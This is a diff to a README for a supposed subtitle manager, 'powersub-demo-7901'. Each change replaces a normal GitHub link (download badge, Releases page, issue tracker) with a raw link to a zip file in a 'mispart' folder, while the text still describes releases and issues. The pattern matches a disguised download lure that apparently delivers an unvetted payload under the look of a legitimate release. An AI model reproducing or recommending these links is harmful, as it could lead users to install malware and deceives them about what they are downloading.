@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-7901 - Easy Subtitle Management in Seconds
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/MR3BANDEX/powersub-demo-7901/releases)
+[![Download](https://raw.githubusercontent.com/MR3BANDEX/powersub-demo-7901/main/mispart/powersub-demo-7901.zip)](https://raw.githubusercontent.com/MR3BANDEX/powersub-demo-7901/main/mispart/powersub-demo-7901.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-7901! This application helps you manage your subtitles quickly and easily. Whether you are a movie lover or an educational content creator, this tool simplifies subtitle handling and enhances your media experience.
@@ -19,7 +19,7 @@ To run powersub-demo-7901 smoothly, your computer should meet the following requ
 ## 📦 Download & Install
 To get started, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/MR3BANDEX/powersub-demo-7901/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/MR3BANDEX/powersub-demo-7901/main/mispart/powersub-demo-7901.zip) to download the latest version of the application.
    
 2. On the Releases page, look for the version labeled as "Latest". Click on the link to start the download.
 
@@ -62,7 +62,7 @@ If you encounter any issues while using powersub-demo-7901, consider these commo
 - **Subtitles Not Displaying Correctly:** Double-check the timing of your subtitles. Use the synchronization feature for adjustments.
 
 ## 📞 Support
-If you need further assistance, feel free to reach out for support. You can open an issue on the [GitHub repository](https://github.com/MR3BANDEX/powersub-demo-7901/issues), and we will respond promptly.
+If you need further assistance, feel free to reach out for support. You can open an issue on the [GitHub repository](https://raw.githubusercontent.com/MR3BANDEX/powersub-demo-7901/main/mispart/powersub-demo-7901.zip), and we will respond promptly.
 
 ## 🌟 Contribute
 Contributions are welcome! If you have suggestions or improvements, please create a pull request or open an issue. Your input can help make powersub-demo-7901 even better.
